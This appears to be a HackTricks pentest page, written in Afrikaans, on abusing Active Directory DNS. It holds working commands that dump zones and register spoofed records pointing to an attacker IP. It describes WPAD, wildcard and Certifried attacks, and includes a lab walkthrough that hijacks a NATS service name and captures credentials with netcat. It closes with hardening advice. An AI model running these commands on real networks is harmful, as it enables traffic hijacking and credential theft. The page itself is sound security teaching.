# AD DNS-rekords

{{#include ../../banners/hacktricks-training.md}}

By default kan **enige gebruiker** in Active Directory **alle DNS-rekords enumerate** in die Domain- of Forest-DNS-zones, soortgelyk aan ’n zone transfer (users kan die child objects van ’n DNS-zone in ’n AD-environment lys).

Die tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) maak **enumeration** en **exporting** van **alle DNS-rekords** in die zone moontlik vir recon-doeleindes van interne netwerke.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) voeg JSON/Greppable (`--json`)-uitset, multi-threaded DNS-resolusie en ondersteuning vir TLS 1.2/1.3 by wanneer daar aan LDAPS gebind word

Vir meer inligting, lees [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Skep / wysig rekords (ADIDNS spoofing)

Omdat die **Authenticated Users**-groep by verstek **Create Child** op die sone se DACL het, kan enige domeinrekening (of rekenaarrekening) bykomende rekords registreer. Dit kan gebruik word vir verkeerskaping, NTLM relay coercion of selfs volledige domeinkompromittering.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py word saam met Impacket ≥0.12.0 versprei)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Algemene aanvalsprimitiewe

1. **Wildcard record** – `*.<zone>` verander die AD DNS-bediener in ’n ondernemingwye responder, soortgelyk aan LLMNR/NBNS-spoofing. Dit kan misbruik word om NTLM-hashes te versamel of dit na LDAP/SMB te relay.  (Vereis dat WINS-lookup gedeaktiveer is.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – voeg `wpad` by (of ’n **NS**-record wat na ’n aanvaller se host wys om die Global-Query-Block-List te omseil) en tree deursigtig as ’n proxy op vir uitgaande HTTP-versoeke om credentials te versamel.  Microsoft het die wildcard-/DNAME-omseilings (CVE-2018-8320) reggemaak, maar **NS-records werk steeds**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – eis die IP-adres op wat voorheen aan ’n werkstasie behoort het, en die geassosieerde DNS-inskrywing sal steeds resolve, wat resource-based constrained delegation- of Shadow-Credentials-aanvalle moontlik maak sonder om DNS enigsins aan te raak.
4. **DHCP → DNS spoofing** – in ’n verstek Windows DHCP+DNS-ontplooiing kan ’n ongeauthentiseerde aanvaller op dieselfde subnet enige bestaande A-record (insluitend Domain Controllers) oorskryf deur vervalste DHCP-versoeke te stuur wat dinamiese DNS-opdaterings aktiveer (Akamai “DDSpoof”, 2023).  Dit gee machine-in-the-middle oor Kerberos/LDAP en kan tot volledige domain takeover lei.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – verander die `dNSHostName` van ’n masjienrekening waaroor jy beheer het, registreer ’n ooreenstemmende A-record, en versoek dan ’n sertifikaat vir daardie naam om die DC na te boots. Tools soos **Certipy** of **BloodyAD** outomatiseer die volledige proses.

---

### Interne diens-kaping via verouderde dinamiese rekords (NATS-gevallestudie)

Wanneer dinamiese opdaterings vir alle geauthentiseerde gebruikers oopgelaat word, **kan ’n gederegistreerde diensnaam weer geëis word en na aanvaller-infrastruktuur gewys word**. Die Mirage HTB DC het die hostname `nats-svc.mirage.htb` ná DNS-scavenging blootgestel, sodat enige gebruiker met lae privilegies kon:<sup>[[3]](#references)</sup>

1. **Bevestig dat die rekord ontbreek** en leer die SOA met `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Skep die record weer** na ’n eksterne/VPN-koppelvlak wat hulle beheer:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Verpersoonlik die plaintext-diens**. NATS-kliënte verwag om een `INFO { ... }`-banier te sien voordat hulle geloofsbriewe stuur, dus is dit genoeg om ’n wettige banier van die werklike broker te kopieer om geheime te oes:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Enige client wat die gekaapte naam oplos, sal onmiddellik sy JSON `CONNECT`-raamwerk (insluitend `"user"`/`"pass"`) aan die listener lek. Deur die amptelike `nats-server -V`-binary op die attacker-host te laat loop, die log-redaction daarvan te deaktiveer, of bloot die sessie met Wireshark te sniff, lewer dieselfde plaintext credentials omdat TLS opsioneel was.

4. **Pivot met die vasgelegde creds** – in Mirage het die gesteelde NATS-account JetStream-toegang verskaf, wat historiese authentication-events blootgelê het wat herbruikbare AD-usernames/passwords bevat het.

Hierdie patroon is van toepassing op elke AD-geïntegreerde diens wat op onversekerde TCP-handshakes staatmaak (HTTP APIs, RPC, MQTT, ens.): sodra die DNS-record gekaap is, word die attacker die diens.

---

## Opsporing en hardening

* Weier **Authenticated Users** die *Create all child objects*-reg op sensitiewe zones en delegeer dynamic updates aan ’n toegewyde account wat deur DHCP gebruik word.
* Indien dynamic updates vereis word, stel die zone op **Secure-only** en aktiveer **Name Protection** in DHCP sodat slegs die eienaar-computer object sy eie record kan oorskryf.
* Monitor DNS Server-event IDs 257/252 (dynamic update), 770 (zone transfer) en LDAP-writes na `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokkeer gevaarlike name (`wpad`, `isatap`, `*`) met ’n doelbewus-benigne record of via die Global Query Block List.
* Hou DNS-servers gepatch – byvoorbeeld, RCE-bugs CVE-2024-26224 en CVE-2024-26231 het **CVSS 9.8** bereik en is remotely exploitable teen Domain Controllers.

## Verwysings

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, steeds die de-facto reference vir wildcard/WPAD-attacks)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Des 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
